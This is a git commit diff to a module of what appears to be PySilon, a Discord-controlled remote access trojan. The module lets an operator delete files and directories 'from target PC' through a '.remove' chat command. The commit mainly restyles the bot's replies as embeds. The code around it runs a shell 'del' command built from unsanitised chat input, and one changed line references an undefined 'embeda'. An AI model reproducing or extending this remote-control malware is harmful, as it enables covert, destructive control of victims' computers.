02e54212a3f9547f7bfd0d89fc007223f07df395
Gvolexe <konlepidas@gmail.com>
2023-07-25 10:23:57 +0300

    Changes requested by (the man )whois-hoeless XD

--- resources/source_code/file_removal.py
+++ resources/source_code/file_removal.py
@@ -9,7 +9,11 @@ elif message.content[:7] == '.remove':
     await message.delete()
     if message.channel.id == channel_ids['file']:
         if message.content.strip() == '.remove':
-            reaction_msg = await message.channel.send('```Syntax: .remove <file-or-directory>```'); await reaction_msg.add_reaction('🔴')
+            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=0x8B0000)
+            embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            
+            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         else:
             if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                 try:
@@ -17,10 +21,26 @@ elif message.content[:7] == '.remove':
                         subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                     else:
                         rmtree('/'.join(working_directory) + '/' + message.content[8:])
-                    reaction_msg = await message.channel.send('```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```'); await reaction_msg.add_reaction('🔴')
+                    embed = discord.Embed(title="🟢 Sucsess",description=f'```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=0x013220)
+                    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                    
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                 except Exception as error:
-                    reaction_msg = await message.channel.send('`' + str(error) + '`'); await reaction_msg.add_reaction('🔴')
+                    embed = discord.Embed(title="📛 Error",description=f'`' + str(error) + '`', colour=0x8B0000)
+                    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                    
+                    reaction_msg = await message.channel.send(embed=embeda); await reaction_msg.add_reaction('🔴')
             else:
-                reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
+                embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=0x8B0000)
+                embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+                
+                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
     else:
-        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+        embed = discord.Embed(title="📛 Error",description=f'||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=0x8B0000)
+        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        
+        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
